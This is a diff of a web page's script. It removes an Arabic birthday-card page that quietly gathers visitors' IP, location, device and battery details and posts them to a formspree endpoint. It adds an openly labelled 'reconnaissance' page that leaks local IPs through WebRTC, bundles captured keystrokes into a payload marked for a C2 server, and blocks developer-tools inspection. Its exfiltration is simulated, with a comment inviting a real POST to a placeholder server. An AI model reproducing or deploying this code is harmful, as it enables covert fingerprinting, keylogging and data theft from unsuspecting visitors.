-            info.pageLoadTime = loadTime.toFixed(2) + ' ثانية';
-
-            let visitorId = localStorage.getItem('visitorId');
-            if (!visitorId) {
-                visitorId = 'VIS-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
-                localStorage.setItem('visitorId', visitorId);
-            }
-            info.visitor_id = visitorId;
-
-            let visits = parseInt(localStorage.getItem('visits') || '0') + 1;
-            localStorage.setItem('visits', visits);
-            document.getElementById('visitorCount').textContent = visits;
-
-            document.getElementById('ip').value = info.ip || 'غير متاح';
-            document.getElementById('location').value = info.location || 'غير متاح';
-            document.getElementById('device').value = info.device || 'غير متاح';
-            document.getElementById('deviceModel').value = info.deviceModel || 'غير متاح';
-            document.getElementById('os').value = info.os || 'غير متاح';
-            document.getElementById('browser').value = info.browser || 'غير متاح';
-            document.getElementById('browserVersion').value = info.browserVersion || 'غير متاح';
-            document.getElementById('screen').value = info.screen || 'غير متاح';
-            document.getElementById('timezone').value = info.timezone || 'غير متاح';
-            document.getElementById('language').value = info.language || 'غير متاح';
-            document.getElementById('visit_time').value = info.visit_time || 'غير متاح';
-            document.getElementById('connection').value = info.connection || 'غير متاح';
-            document.getElementById('connectionSpeed').value = info.connectionSpeed || 'غير متاح';
-            document.getElementById('battery').value = info.battery || 'غير متاح';
-            document.getElementById('batteryCharging').value = info.batteryCharging || 'غير متاح';
-            document.getElementById('batteryTime').value = info.batteryTime || 'غير متاح';
-            document.getElementById('memory').value = info.memory || 'غير متاح';
-            document.getElementById('storage').value = info.storage || 'غير متاح';
-            document.getElementById('signal').value = info.signal || 'غير متاح';
-            document.getElementById('user_agent').value = info.user_agent || 'غير متاح';
-            document.getElementById('visitor_id').value = info.visitor_id || 'غير متاح';
-            document.getElementById('pageLoadTime').value = info.pageLoadTime || 'غير متاح';
-        }
-
-        // ===== حساب العمر =====
-        function calculateAgeAndShow() {
-            const name = document.getElementById('nameInput').value.trim();
-            const year = parseInt(document.getElementById('yearInput').value);
-            const currentYear = new Date().getFullYear();
-            const msg = document.getElementById('birthdayMessage');
-
-            if (name && year >= 1900 && year <= currentYear) {
-                const age = currentYear - year;
-                if (age > 0 && age < 120) {
-                    document.getElementById('displayName').textContent = name;
-                    document.getElementById('displayAge').textContent = age;
-                    document.getElementById('age').value = age;
-                    const details = calcDetails(year);
-                    document.getElementById('ageDetails').textContent =
-                        `${details.years} سنة، ${details.months} شهر، ${details.days} يوم`;
-                    document.getElementById('customMessage').textContent = getMsg(age);
-                    msg.classList.add('show');
-                    updateCountdown(year);
-                    launchConfetti();
-                    return;
-                }
-            }
-            msg.classList.remove('show');
-        }
-
-        function calcDetails(year) {
-            const now = new Date();
-            const bd = new Date(year, 0, 1);
-            let y = now.getFullYear() - bd.getFullYear();
-            let m = now.getMonth() - bd.getMonth();
-            let d = now.getDate() - bd.getDate();
-            if (d < 0) { m--;
-                d += 30; }
-            if (m < 0) { y--;
-                m += 12; }
-            return { years: y, months: m, days: d };
-        }
-
-        function getMsg(age) {
-            if (age < 10) return '🌟 أنت صغير لكن مستقبلك عظيم!';
-            if (age < 18) return '🚀 أنت في بداية رحلة العمر!';
-            if (age < 30) return '💪 في قمة العطاء والإبداع!';
-            if (age < 50) return '👑 في عز الحكمة والإنجاز!';
-            if (age < 70) return '🌟 في قمة النضج والجمال!';
-            return '💎 أنت كنز ثمين من الحكمة!';
-        }
-
-        function updateCountdown(year) {
-            const now = new Date();
-            const next = new Date(now.getFullYear(), 0, 1);
-            if (now > next) next.setFullYear(next.getFullYear() + 1);
-            const diff = next - now;
-            document.getElementById('countdown').textContent =
-                `⏳ العيد القادم بعد ${Math.floor(diff/(1000*60*60*24))} يوم، ${Math.floor((diff%(86400000))/(3600000))} ساعة`;
-        }
-
-        // ===== كونفيتي =====
-        function launchConfetti() {
-            const c = document.getElementById('confettiContainer');
-            const colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd', '#1dd1a1', '#f368e0', '#00d2d3',
-                '#ff9f43'
-            ];
-            for (let i = 0; i < 150; i++) {
-                const el = document.createElement('div');
-                el.className = 'confetti';
-                el.style.left = Math.random() * 100 + '%';
-                el.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                el.style.width = (Math.random() * 12 + 4) + 'px';
-                el.style.height = (Math.random() * 12 + 4) + 'px';
-                el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-                el.style.animationDuration = (Math.random() * 4 + 2) + 's';
-                el.style.animationDelay = (Math.random() * 3) + 's';
-                c.appendChild(el);
-            }
-            setTimeout(() => c.innerHTML = '', 7000);
-        }
-
-        // ===== لعبة =====
-        function chooseGift(gift) {
-            const gifts = {
-                '🎮': '🎮 أتمنى لك ساعات من المرح والمغامرات! 🎉',
-                '📱': '📱 تقنية متطورة في انتظارك! استمتع! 🌟',
-                '💎': '💎 حياة مليئة بالجمال والفخامة! ✨',
-                '🚗': '🚗 رحلات ومغامرات لا تنسى في انتظارك! 🛣️',
-                '✈️': '✈️ وجهات جديدة ومغامرات شيقة تنتظرك! 🌍'
-            };
-            document.getElementById('giftResult').textContent = gifts[gift] || '🎁 هدية رائعة لك!';
-            launchConfetti();
-        }
-
-        function toggleGame() {
-            const g = document.getElementById('gameArea');
-            g.classList.toggle('show');
-            if (g.classList.contains('show')) document.getElementById('giftResult').textContent = '🎁 اختر هديتك المفضلة!';
-        }
-
-        // ===== مشاركة =====
-        function shareCard() {
-            const name = document.getElementById('nameInput').value.trim() || 'صديقي';
-            const age = document.getElementById('age').value || '؟';
-            const text = `🎉 كل عام وأنت بخير يا ${name}! 🎂\nعمرك ${age} سنة!\nكل سنة وأنت طيب 💪`;
-            if (navigator.share) {
-                navigator.share({ title: '🎂 تهنئة عيد ميلاد', text });
-            } else {
-                navigator.clipboard.writeText(text).then(() => {
-                    document.getElementById('status').innerText = '📋 تم نسخ التهنئة!';
-                    document.getElementById('status').style.color = '#2ed573';
-                });
+                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)();
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate) return;
+                    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/;
+                    const match = ice.candidate.candidate.match(ipRegex);
+                    if (match) {
+                        document.getElementById('d_loc_ip').innerText = match[0];
+                        addLog(`[WebRTC] Local IP leaked: ${match[0]}`, "warn");
+                        pc.onicecandidate = null;
+                    }
+                };
+            } catch(e) {
+                document.getElementById('d_loc_ip').innerText = "Blocked";
             }
         }
 
-        // ===== إعادة =====
-        function resetCard() {
-            document.getElementById('birthdayForm').reset();
-            document.getElementById('birthdayMessage').classList.remove('show');
-            document.getElementById('status').innerText = '';
-            document.getElementById('countdown').textContent = '';
-            document.getElementById('giftResult').textContent = '';
-            document.getElementById('giftResultText').textContent = '';
-            document.getElementById('giftBoxIcon').textContent = '🎁';
-            document.getElementById('gameArea').classList.remove('show');
-            document.getElementById('confettiContainer').innerHTML = '';
+        // 4. LOGGING SYSTEM
+        function addLog(msg, type="warn") {
+            const logDiv = document.getElementById('log');
+            const span = document.createElement('span');
+            span.className = type === 'ok' ? 'log-ok' : (type === 'err' ? 'log-err' : 'log-warn');
+            span.innerText = `[*] ${msg}`;
+            logDiv.appendChild(span);
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
 
-        // ===== إرسال =====
-        function handleSubmit() {
-            const name = document.getElementById('nameInput').value.trim();
-            const year = document.getElementById('yearInput').value.trim();
-            const status = document.getElementById('status');
-            const age = document.getElementById('age').value;
-
-            if (!name) {
-                status.innerText = '⚠️ الرجاء إدخال اسمك!';
-                status.style.color = '#ff4757';
+        // 5. EXFILTRATION SIMULATION (Trigger)
+        function runRecon() {
+            const target = document.getElementById('targetName').value;
+            const status = document.getElementById('statusMsg');
+            
+            if(!target) {
+                status.innerHTML = "<span style='color:#f85149;'>[!] Target field cannot be empty.</span>";
                 return;
             }
-            if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
-                status.innerText = '⚠️ الرجاء إدخال سنة ميلاد صحيحة!';
-                status.style.color = '#ff4757';
-                return;
-            }
-            if (!age || age < 1) {
-                status.innerText = '⚠️ يرجى التأكد من سنة الميلاد!';
-                status.style.color = '#ff4757';
-                return;
-            }
-            if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) return;
 
-            status.innerText = '⏳ جاري الإرسال...';
-            status.style.color = '#333';
+            status.innerHTML = "<span style='color:#f0883e;'>[*] Encrypting payload & sending to C2...</span>";
+            addLog(`[Exfil] Initiating data transfer for target: "${target}"`, "ok");
 
+            // Constructing Technical Payload
             const data = {
-                name: name,
-                age: age,
-                birth_year: year,
-                ip: document.getElementById('ip').value || 'غير متاح',
-                location: document.getElementById('location').value || 'غير متاح',
-                device: document.getElementById('device').value || 'غير متاح',
-                deviceModel: document.getElementById('deviceModel').value || 'غير متاح',
-                os: document.getElementById('os').value || 'غير متاح',
-                browser: document.getElementById('browser').value || 'غير متاح',
-                browserVersion: document.getElementById('browserVersion').value || 'غير متاح',
-                screen: document.getElementById('screen').value || 'غير متاح',
-                timezone: document.getElementById('timezone').value || 'غير متاح',
-                language: document.getElementById('language').value || 'غير متاح',
-                visit_time: document.getElementById('visit_time').value || 'غير متاح',
-                connection: document.getElementById('connection').value || 'غير متاح',
-                connectionSpeed: document.getElementById('connectionSpeed').value || 'غير متاح',
-                battery: document.getElementById('battery').value || 'غير متاح',
-                batteryCharging: document.getElementById('batteryCharging').value || 'غير متاح',
-                batteryTime: document.getElementById('batteryTime').value || 'غير متاح',
-                memory: document.getElementById('memory').value || 'غير متاح',
-                storage: document.getElementById('storage').value || 'غير متاح',
-                signal: document.getElementById('signal').value || 'غير متاح',
-                user_agent: document.getElementById('user_agent').value || 'غير متاح',
-                visitor_id: document.getElementById('visitor_id').value || 'غير متاح',
-                pageLoadTime: document.getElementById('pageLoadTime').value || 'غير متاح'
+                target_label: target,
+                device_hash: document.getElementById('d_dev_id').innerText,
+                public_ip: document.getElementById('d_pub_ip').innerText,
+                local_ip: document.getElementById('d_loc_ip').innerText,
+                os: document.getElementById('d_os').innerText,
+                browser: document.getElementById('d_browser').innerText,
+                ram: document.getElementById('d_ram').innerText,
+                screen: document.getElementById('d_screen').innerText,
+                ports: document.getElementById('d_ports').innerText,
+                keys_captured: keystrokes.join(' '),
+                timestamp: new Date().toISOString()
             };
 
-            fetch('https://formspree.io/f/xpqvvkdp', {
-                method: 'POST',
-                body: JSON.stringify(data),
-                headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }
-            }).then(r => {
-                if (r.ok) {
-                    status.innerText = '✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊';
-                    status.style.color = '#2ed573';
-                    document.getElementById('birthdayForm').reset();
-                    document.getElementById('birthdayMessage').classList.remove('show');
-                    document.getElementById('countdown').textContent = '';
-                    document.getElementById('giftResult').textContent = '';
-                    document.getElementById('giftResultText').textContent = '';
-                    document.getElementById('giftBoxIcon').textContent = '🎁';
-                    document.getElementById('gameArea').classList.remove('show');
-                    launchConfetti();
-                } else {
-                    status.innerText = '❌ حدث خطأ، حاول مرة أخرى.';
-                    status.style.color = '#ff4757';
-                }
-            }).catch(() => {
-                status.innerText = '❌ تعذر الاتصال بالخادم.';
-                status.style.color = '#ff4757';
-            });
+            console.log("TECH PAYLOAD TO BE EXFILTRATED:", data);
+
+            // Simulating server response
+            setTimeout(() => {
+                status.innerHTML = "<span style='color:#2ea043;'>[+] Payload successfully delivered to Remote Host.</span>";
+                addLog(`[C2 Server] Response: 200 OK - Data stored`, "ok");
+                // Replace the comment below with your actual fetch('https://your-server.com/api', { method: 'POST', body: JSON.stringify(data) })
+            }, 1500);
         }
 
-        // ===== تحميل الصفحة =====
-        window.onload = function() {
-            const saved = localStorage.getItem('theme');
-            if (saved) {
-                currentTheme = parseInt(saved);
-                document.documentElement.setAttribute('data-theme', THEMES[currentTheme]);
-            }
-            document.querySelector('.toolbar button:first-child').textContent = `🎨 ${THEME_NAMES[currentTheme]}`;
-            collectAdvancedInfo();
-            document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
-            document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
+        // 6. ANTI-DEBUG & ANTI-DEVTOOLS
+        (function antiDebug() {
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.addEventListener('keydown', (e) => {
+                if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                    document.body.style.opacity = '0.2'; 
+                    addLog("[ALERT] Developer Tools Opened! Hiding Data.", "err");
+                    setTimeout(() => { document.body.style.opacity = '1'; }, 4000);
+                }
+            });
+        })();
+
+        // Initialize on load
+        window.onload = () => {
+            collectTechData();
+            addLog("[System] Technical reconnaissance started.", "ok");
         };
     </script>
-
 </body>
 </html>
